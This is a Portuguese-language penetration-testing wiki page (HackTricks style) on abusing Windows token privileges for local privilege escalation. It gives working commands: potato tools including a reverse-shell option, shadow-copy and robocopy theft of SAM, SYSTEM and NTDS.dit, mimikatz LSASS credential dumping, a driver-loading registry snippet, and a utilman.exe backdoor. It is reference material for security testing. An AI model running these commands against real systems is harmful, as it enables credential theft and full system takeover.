# Abusando de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens**, leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Você pode conseguir escalar privilégios abusando de tokens que já possui.**

### SeImpersonatePrivilege

Esse privilégio permite que um processo represente (mas não crie) um token quando consegue obter um handle para esse token. Um token privilegiado pode ser obtido de um serviço do Windows (DCOM) induzindo-o a realizar autenticação NTLM contra um exploit, permitindo subsequentemente a execução de um processo com privilégios SYSTEM.<sup>[[2]](#references)</sup> Essa primitiva pode ser explorada usando ferramentas como [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que exige que o WinRM esteja desabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Um aplicativo web acessível apenas por loopback pode ser uma pista independente de coerção se um usuário local puder acessar um endpoint autenticado que faça uma requisição a uma URL escolhida pelo chamador sob uma identidade mais privilegiada. Analise a autorização e as restrições de URL do endpoint, a identidade real do cliente de saída e seu comportamento de autenticação, além de verificar se esse cliente consegue alcançar um listener controlado pelo usuário com menos privilégios. A presença de `SeImpersonatePrivilege` habilitado, de um listener IIS ou de um parâmetro para buscar uma URL, por si só, não comprova a existência de um token privilegiado ou de um caminho de escalação. Mantenha essa análise passiva; não envie requisições de coerção durante a enumeração. Consulte a documentação da Microsoft sobre [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) e [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Observações modernas para operadores:

- **JuicyPotato é legado**: no Windows 10 1809+/Server 2019+, prefira **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer**, dependendo de qual superfície RPC/COM ainda está acessível.
- Se você comprometeu um serviço executado como **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** e `whoami /priv` mostra um **token filtrado** sem `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupere primeiro o **conjunto padrão de privilégios** da conta (por exemplo, com **FullPowers**) e depois tente novamente a família potato.<sup>[[3]](#references)</sup>
- Alguns forks mais recentes são mais práticos para operadores do que as ferramentas originais. Por exemplo, **SigmaPotato** adiciona execução por reflection/in-memory e compatibilidade com versões modernas do Windows, enquanto **PrintNotifyPotato** abusa do serviço COM PrintNotify e costuma ser útil quando o caminho clássico do Spooler está desabilitado.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante a **SeImpersonatePrivilege**: usará o **mesmo método** para obter um token privilegiado.\
Em seguida, esse privilégio permite **atribuir um token primário** a um processo novo/suspenso. Com o token de impersonation privilegiado, você pode derivar um token primário (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, você não pode modificar o token primário de um processo em execução).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se esse token estiver habilitado, você poderá usar **KERB_S4U_LOGON** para obter um **token de impersonation** de qualquer outro usuário sem conhecer as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **nível de integridade** do token como "**medium**" e atribuir esse token à **thread atual** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Esse privilégio faz com que o sistema **conceda acesso de leitura** a qualquer arquivo (limitado a operações de leitura). Ele é usado para **ler os hashes de senha das contas de Administrador local** no registro; depois, ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas situações: quando a conta de Administrador local está desabilitada ou quando há uma política que remove os direitos administrativos de Administradores locais que se conectam remotamente.<sup>[[2]](#references)</sup>\
Na prática, o fluxo de trabalho integrado mais confiável geralmente é **VSS + `robocopy /b`**: criar/expor uma cópia de sombra e, em seguida, copiar `SAM`/`SYSTEM` ou `NTDS.dit` no **modo de backup**, ignorando as ACLs dos arquivos.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Você pode **abusar deste privilégio** com:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- acompanhando **IppSec** em [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou conforme explicado na seção sobre **escalada de privilégios com Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilégio permite **acesso de gravação** a qualquer arquivo do sistema, independentemente da Access Control List (ACL) do arquivo. Ele abre inúmeras possibilidades de escalada, incluindo a capacidade de **modificar serviços**, realizar DLL Hijacking e definir **depuradores** por meio de Image File Execution Options, entre várias outras técnicas.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário pode impersonar tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da possibilidade de impersonar um token que represente o mesmo usuário e cujo nível de integridade não exceda o do processo atual.<sup>[[2]](#references)</sup>

**Pontos principais:**

- **Impersonação sem SeImpersonatePrivilege:** É possível usar SeCreateTokenPrivilege para EoP por meio da impersonação de tokens sob condições específicas.
- **Condições para impersonação de tokens:** Para que a impersonação seja bem-sucedida, o token de destino deve pertencer ao mesmo usuário e ter um nível de integridade menor ou igual ao do processo que tenta impersoná-lo.
- **Criação e modificação de tokens de impersonação:** Os usuários podem criar um token de impersonação e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite que um processo **carregue e descarregue drivers de dispositivo** criando uma entrada no registro com valores específicos de `ImagePath` e `Type`. Como o acesso direto de gravação a `HKLM` (HKEY_LOCAL_MACHINE) é restrito, é possível usar `HKCU` (HKEY_CURRENT_USER). No entanto, é necessário um caminho específico para que o kernel reconheça a entrada de `HKCU` como uma configuração de driver.<sup>[[2]](#references)</sup>

O uso ofensivo moderno geralmente envolve **BYOVD** (bring your own vulnerable driver): carregar um driver de kernel **assinado, mas vulnerável**, e usar seus IOCTLs para desativar proteções ou obter execução de código no kernel. Tenha em mente que, nas versões recentes do Windows 11/Server, a **lista de bloqueio de drivers vulneráveis da Microsoft** e/ou **HVCI/Memory Integrity** frequentemente impedem cadeias públicas antigas; portanto, os exemplos clássicos no estilo `szkg64.sys` já não são confiáveis em todos os casos.

Este caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, é necessário criar esse caminho inteiro e definir dois valores:<sup>[[2]](#references)</sup>

- `ImagePath`, que é o caminho para o binário a ser executado
- `Type`, com o valor `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Etapas a seguir:**

1. Acesse `HKCU` em vez de `HKLM`, devido às restrições de acesso de gravação.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` em `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` como o caminho de execução do binário.
4. Defina `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Mais formas de abusar deste privilégio em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

É semelhante a **SeRestorePrivilege**. Sua função principal permite que um processo **assuma a propriedade de um objeto**, contornando a exigência de acesso discricionário explícito por meio da concessão de direitos de acesso WRITE_OWNER. O processo envolve primeiro obter a propriedade da chave de Registro desejada para fins de gravação e, em seguida, alterar a DACL para permitir operações de gravação.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Esse privilégio permite **depurar outros processos**, inclusive ler e gravar na memória. Com esse privilégio, podem ser usadas várias estratégias de injeção de memória capazes de evadir a maioria das soluções antivírus e de prevenção contra intrusões no host.<sup>[[2]](#references)</sup>

No Windows moderno, lembre-se de que `SeDebugPrivilege` geralmente basta para abrir **processos SYSTEM não protegidos** e duplicar seus tokens, mas **não** garante que você possa acessar o **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não poderão ler nem injetar no LSASS, mesmo que `SeDebugPrivilege` esteja presente. Nesse caso, roube um token de outro processo SYSTEM que não seja PPL ou encadeie a técnica com um bypass de PPL/BYOVD, em vez de presumir que `procdump` funcionará. Para ver um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, confira [esta página](sedebug-+-seimpersonate-copy-token.md).

#### Despejar memória

Você pode usar o [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), da [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), para **capturar a memória de um processo**. Isso pode ser aplicado especificamente ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsável por armazenar as credenciais do usuário depois que ele faz logon no sistema com sucesso.

Em seguida, você pode carregar esse dump no mimikatz para obter senhas:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Um dump do LSASS salvo anteriormente e legível pode estar disponível, mesmo que a conta atual não tenha permissão para capturar o processo protegido em execução. Trate um arquivo de dump ou um arquivo compactado com nome semelhante apenas como uma pista: verifique o acesso e o conteúdo e, em seguida, avalie se alguma credencial recuperada ainda é válida e permite obter um contexto com privilégios mais elevados. O nome do arquivo, por si só, não comprova que o arquivo compactado contém um dump nem que as credenciais possam ser reutilizadas.

#### RCE

Se quiser obter um shell `NT SYSTEM`, você pode usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Este direito (Executar tarefas de manutenção de volume) pode permitir operações privilegiadas em volumes, mas não garante, por si só, um identificador de volume bruto legível nem acesso arbitrário a arquivos. As ACLs dos dispositivos, o estado do token, a versão do Windows e a operação solicitada ainda são relevantes. Uma operação de controle de volume permitida pode, em vez disso, alterar as ACLs do sistema de arquivos; essa é uma ação mutável que pode afetar todo o volume. Em um host de CA, o abuso de certificados também exige acesso a material utilizável de chave privada, e arquivos protegidos por EFS ainda exigem uma chave de descriptografia ou recuperação autorizada. Consulte abaixo os pré-requisitos detalhados.<sup>[[5]](#references)</sup>

Consulte técnicas detalhadas e mitigações:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Verificar privilégios

```
whoami /priv
```

Os **tokens que aparecem como Disabled** geralmente podem ser habilitados, então muitas vezes você pode abusar tanto de privilégios _Enabled_ quanto de _Disabled_.

### Habilitar todos os tokens

Se você tiver privilégios desabilitados, poderá usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ou o **script** incorporado nesta [**publicação**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Guia de consulta completo sobre privilégios de token em [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); o resumo abaixo lista apenas formas diretas de explorar o privilégio para obter uma sessão de administrador ou ler arquivos confidenciais.<sup>[[1]](#references)</sup>

| Privilégio                 | Impacto     | Ferramenta              | Caminho de execução                                                                                                                                                                                                                                                                                                                                   | Observações                                                                                                                                                                                                                                                                                                                      |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Administrador**_ | ferramenta de terceiros | _"Permite que um usuário se faça passar por tokens e eleve privilégios para nt system usando ferramentas como potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                       | Obrigado a [Aurélien Chalot](https://twitter.com/Defte_) pela atualização. Em breve, tentarei reformular isto como uma receita mais prática.                                                                                                                                                                                    |
| **`SeBackup`**             | **Ameaça**  | _**Comandos integrados**_ | Ler arquivos confidenciais com `robocopy /b` ou ferramentas dedicadas de cópia compatíveis com SeBackup.                                                                                                                                                                                                                                               | <p>- Útil para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e, às vezes, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` é conveniente, mas cmdlets/APIs dedicados de SeBackup costumam ser mais flexíveis para arquivos bloqueados/abertos.</p>                                                                                              |
| **`SeCreateToken`**        | _**Administrador**_ | ferramenta de terceiros | Criar um token arbitrário, incluindo direitos de administrador local, com `NtCreateToken`.                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Administrador**_ | **PowerShell**          | Duplicar um token SYSTEM **não PPL** ou despejar a memória de um processo não protegido.                                                                                                                                                                                                                                                            | <p>O despejo de LSASS costuma ser bloqueado se RunAsPPL/LSA Protection estiver habilitado.</p><p>O script está disponível em [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                         |
| **`SeImpersonate`**        | _**Administrador**_ | ferramenta de terceiros | Usar a **família Potato** / representação via named pipe para iniciar um processo como SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` etc.).                                                                                                                                                                  | <p>Mais prático em contas de serviço, como IIS APPPOOL, MSSQL, tarefas agendadas ou qualquer contexto que já tenha `SeImpersonatePrivilege`.</p>                                                                                                                                                                                |
| **`SeLoadDriver`**         | _**Administrador**_ | ferramenta de terceiros | <p>1. Carregar um driver de kernel assinado, mas vulnerável (BYOVD)<br>2. Usar os IOCTLs do driver para obter acesso de leitura/gravação ao kernel, desabilitar ferramentas de segurança ou elevar privilégios para SYSTEM<br><br>Como alternativa, o privilégio pode ser usado para descarregar drivers relacionados à segurança com o comando integrado <code>fltMC</code>, por exemplo, <code>fltMC sysmondrv</code></p> | <p>Drivers públicos mais antigos, como <code>szkg64.sys</code>, são cada vez mais bloqueados nas versões modernas do Windows pela lista de bloqueio de drivers vulneráveis / HVCI.</p>                                                                                                                                          |
| **`SeRestore`**            | _**Administrador**_ | **PowerShell**          | <p>1. Iniciar o PowerShell/ISE com o privilégio SeRestore disponível.<br>2. Habilitar o privilégio com <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renomear utilman.exe para utilman.old<br>4. Renomear cmd.exe para utilman.exe<br>5. Bloquear o console e pressionar Win+U</p> | <p>O ataque pode ser detectado por alguns softwares antivírus.</p><p>Um método alternativo consiste em substituir binários de serviços armazenados em "Program Files" usando o mesmo privilégio.</p>                                                                                                                          |
| **`SeTakeOwnership`**      | _**Administrador**_ | _**Comandos integrados**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renomear cmd.exe para utilman.exe<br>4. Bloquear o console e pressionar Win+U</p>                                                                                                                                   | <p>O ataque pode ser detectado por alguns softwares antivírus.</p><p>Um método alternativo consiste em substituir binários de serviços armazenados em "Program Files" usando o mesmo privilégio.</p>                                                                                                                          |
| **`SeTcb`**                | _**Administrador**_ | ferramenta de terceiros | <p>Manipular tokens para incluir direitos de administrador local. Pode exigir SeImpersonate.</p><p>A verificar.</p>                                                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - caminhos de exploração dos privilégios do Windows até administrador](https://github.com/gtworek/Priv2Admin)
- [2] [Abusando de privilégios de token para LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Devolvam meus privilégios! Por favor?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (o modo de backup `/b` ignora verificações de ACL de arquivos/pastas)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Executar tarefas de manutenção de volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → exfiltração da chave da CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
